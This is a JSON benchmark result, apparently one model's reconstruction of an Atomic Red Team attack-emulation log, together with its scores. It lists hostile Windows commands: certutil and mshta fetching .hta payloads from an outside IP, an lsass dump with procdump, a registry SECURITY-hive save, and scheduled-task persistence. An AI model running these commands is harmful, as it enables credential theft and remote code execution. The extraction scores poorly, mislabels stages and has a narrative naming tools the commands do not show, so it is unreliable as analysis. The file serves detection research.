@@ -1,0 +1,156 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": ",ServerName:kaltura.microsoftonline.com -ServerName:",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Program Files\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /svc",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "CertUtil.exe -encode Test.hta encoded.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "(GWMI -List Win32_Share).Remove('\\\\\\?\\C:\\Program Files\\Windows Defender\\MpCmdRun.exe', '', '')",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe  /C \"start C:\\Users\\Administrator\\Desktop\\shell\\T1059.003_script.bat\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C \"start C:\\Users\\Administrator\\Desktop\\shell\\T1059.003_script.bat\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe  /C \"timeout /t 3 >nul && echo TestSVC > \\.\\\\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\cmd.exe  /C \"timeout /t 3 >nul && echo TestSVC > \\.\\\\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe save hklm\\Security c:\\users\\administrator\\appdata\\local\\temp\\tbjkjpetfjp",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe  /C \"del /f /s lsass_dump.dmp\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C \"procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C \"mkdir C:%HOMEPATH%\\Desktop\\T1022 & echo ipconfig /all > C:%HOMEPATH%\\Desktop\\T1022\\T1022.txt & 7z.exe a -tzip T1022.zip C:%HOMEPATH%\\Desktop\\T1022\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C \"mkdir %temp%\\T1119_command_prompt_collection >nul 2>\\1 & dir c: /b /s .docx | findstr /e .docx & for /R c: %%f in (*.docx) do copy %%f %temp%\\T1119_command_prompt_collection\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C \"rmdir /s /q C:%HOMEPATH%\\Desktop\\T1022\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "net group \"Domain Admins\" /domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:/AtomicRedTeam/atomaics/T1119/bin/msxsl.exe C:/AtomicRedTeam/atomaics/T1119/src/msxslxmlfile.xml C:/AtomicRedTeam/atomaics/T1119/src/msxslscript.xsl",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cscript.exe C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cscript.exe C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\c153chpy\\c153chpy.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\c153chpy\\c153chpy.dll",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\48d8u676\\48d8u676.cmdline\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "An attacker has compromised the target system using various tactics such as exploiting vulnerabilities, executing shell commands, downloading payloads from remote servers, and creating scheduled tasks. The attacker then uses tools like Mimikatz and Procdump to gather sensitive information from the system, including credentials and memory dumps. The attack continues with lateral movement, connecting to multiple IP addresses, and collecting data from the system through various means. The attacker also creates new processes and files, indicating persistence and attempts to evade detection.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 120989,
+      "completion_tokens": 4798,
+      "total_tokens": 125787,
+      "wall_clock_s": 126.172,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.14285714285714285,
+      "recall": 0.1111111111111111,
+      "f1": 0.125,
+      "tp": 4,
+      "fp": 24,
+      "fn": 32
+    },
+    "stage": {
+      "precision": 0.07142857142857142,
+      "recall": 0.05405405405405406,
+      "f1": 0.06153846153846154,
+      "tp": 2,
+      "fp": 26,
+      "fn": 35,
+      "recall_partial": 0.0945945945945946
+    },
+    "hallucination_rate": 0.14814814814814814,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 120989,
+      "completion_tokens": 4798,
+      "total_tokens": 125787,
+      "wall_clock_s": 126.172,
+      "parse_retries": 1
+    }
+  }
+}
